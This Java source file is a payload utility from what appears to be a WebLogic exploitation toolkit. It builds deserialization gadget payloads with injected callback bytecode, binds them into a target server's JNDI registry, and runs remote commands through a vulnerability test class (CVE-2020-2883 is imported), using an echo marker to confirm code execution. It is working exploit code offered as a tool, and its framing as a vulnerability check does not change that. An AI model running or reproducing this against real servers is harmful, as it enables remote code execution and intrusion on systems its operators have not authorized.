/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.utils;

import com.weblogic.framework.call.Call;
import com.weblogic.framework.entity.ContextPojo;
import com.weblogic.framework.entity.GadgetParam;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.gadget.ObjectGadget;
import com.weblogic.framework.entity.VulCheckParam;
import com.weblogic.framework.vuls.impl.CVE_2020_2883;
import com.weblogic.framework.vuls.VulTest;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.NotFoundException;

import javax.naming.Context;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.Remote;

import static com.weblogic.framework.config.CharsetConfig.defaultCharsetName;
import static com.weblogic.framework.utils.CallUtils.*;
import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
import static com.weblogic.framework.utils.ContextUtils.rebind;
import static com.weblogic.framework.utils.StringUtils.getRandomString;
import static com.weblogic.framework.utils.UrlUtils.buildJNDIUrl;
import static com.weblogic.framework.utils.UrlUtils.checkJavascriptUrl;
import static com.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.weblogic.framework.utils.VersionUtils.getVersion;
import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: PayloadUtils
 * Desc: Payload Utils
 * Date: 2020/4/19 18:07
 *
 * @version 1.0.0
 */
public class PayloadUtils {
    /**
     * 私有化构造
     */
    private PayloadUtils(){}

    /**
     * 生成回调 POC
     * @param callName
     * @param token
     * @return
     */
    public static Object generatePocCall(String callName, String token) throws Exception {
        callName = isBlank(callName) ? DEFAULT_CALL : callName;
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.getAndRename(callClazz.getName(), callClazz.getSimpleName());
        ctClass.getDeclaredMethod("jndiBind").insertBefore("$1=\""+token+"\";");
        ctClass.writeFile(System.getProperty("user.dir"));
        System.out.println(callName+" 写入成功，token："+token);
        return null;
    }

    public static Object generatePayload(final Class<? extends ObjectGadget<?>> clazz, VulCheckParam vulCheckParam) throws Exception {
        ObjectGadget<?> payload = clazz.newInstance();
//        payload.getObject();
        return null;
    }

    /**
     * 通用漏洞验证
     * @param url url
     * @param gadgetClazz gadget Clazz
     * @param vulTest vulTest
     * @param vulCheckParam 漏洞验证参数
     * @return
     * @throws Exception
     */
    public static Boolean baseVulnerable(String url, final Class<? extends ObjectGadget<?>> gadgetClazz, final VulTest vulTest, VulCheckParam vulCheckParam) throws Exception{

        if(vulCheckParam == null){
            vulCheckParam = new VulCheckParam();
            vulCheckParam.setCharsetName(defaultCharsetName);
            vulCheckParam.setCallName(DEFAULT_CALL);
            URL checkURL = new URL(url);
            vulCheckParam.setVersion(getVersion(checkURL.getHost(), checkURL.getPort() == -1 ? 80: checkURL.getPort()));
        }
        String version = vulCheckParam.getVersion();
        version = isBlank(version) ? "10.3.6.0" :version;
        String[] VUL_VERSIONS = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_VERSIONS");
        String[] VUL_DEPENDENCIES = (String[]) ReflectionUtils.getFieldValue(vulTest, "VUL_DEPENDENCIES");
        Boolean versionFlag = checkVersion(version,VUL_VERSIONS);
        if(!versionFlag){
            return false;
        }
        String javascriptUrl = "";
        if(version.contains("12.1.3.0")){
            javascriptUrl = "";
        }else{
            if(isBlank(vulCheckParam.getJavascriptUrl()) && !version.contains("10.3.6")){
                throw new MyException("javascript.jar 链接不能为空");
            }
            if(!version.contains("10.3.6") && !version.contains("10.3.5")){
                checkJavascriptUrl(vulCheckParam.getJavascriptUrl());
            }
            javascriptUrl = vulCheckParam.getJavascriptUrl();
        }
        URLClassLoader urlClassLoader = loadJar(version,VUL_DEPENDENCIES);
        // 编码，默认根据用户的操作系统提取
        String charsetName = isBlank(vulCheckParam.getCharsetName()) ? defaultCharsetName : vulCheckParam.getCharsetName();
        // 回调类名称，默认为 ClusterMasterRemote
        String callName = isBlank(vulCheckParam.getCallName()) ? DEFAULT_CALL : vulCheckParam.getCallName();
        // 构建回调类字节码
        byte[] bytes = buildBytes(callName);
        String bindName = getRandomString(16);
        Class<? extends Remote> callClazz = CALL_MAP.get(callName);
        ObjectGadget gadget = gadgetClazz.newInstance();
        GadgetParam gadgetParam = new GadgetParam();
        gadgetParam.setBootArgs(new String[]{bindName, javascriptUrl});
        gadgetParam.setCodeByte(bytes);
        gadgetParam.setClassName(callClazz.getSimpleName());
        gadgetParam.setUrlClassLoader(urlClassLoader);
        Object sendObject = gadget.getObject(gadgetParam);
        String jndiUrl = buildJNDIUrl(url, vulCheckParam.getProtocol());
        ContextPojo contextPojo = null;
        try{
            contextPojo = rebind(jndiUrl, sendObject, urlClassLoader);
        }catch (Exception e){
            // TODO:
        }
        if(contextPojo == null || contextPojo.getContext() == null || contextPojo.getUrlClassLoader() == null){
            return false;
        }
        Context context = contextPojo.getContext();
        try{
            Object objectCall = context.lookup(bindName);
            ReflectionUtils.setFieldValue(vulTest, "bindName", bindName);
            ReflectionUtils.setFieldValue(vulTest, "currentContext", context);
            ReflectionUtils.setFieldValue(vulTest, "remote", objectCall);
            String result = vulTest.exploit(url, "echo a136d86442181f45a4446f5fb8a49f7f", charsetName);
            System.out.println(result);
            return result.contains("a136d86442181f45a4446f5fb8a49f7f");
        }catch (Exception e){
            return false;
        }finally {
            // 设置为 null，强制让 GC 回收
            urlClassLoader = null;
            System.gc();
        }
    }

    public static void main(String[] args) throws Exception {
        generatePocCall(null,"123143124");
    }

}
